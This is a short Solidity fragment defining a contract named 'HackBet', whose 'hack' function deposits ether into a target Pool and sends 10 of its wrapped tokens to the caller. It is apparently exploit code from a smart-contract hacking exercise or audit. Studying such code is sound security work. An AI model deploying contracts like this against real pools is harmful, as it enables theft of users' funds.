...
contract HackBet {
    function hack(address pool) external payable {
        Pool(pool).deposit{value: msg.value}(0);

        address wrappedToken = Pool(pool).wrappedToken();

        ERC20(wrappedToken).transfer(msg.sender, 10);
    }
}
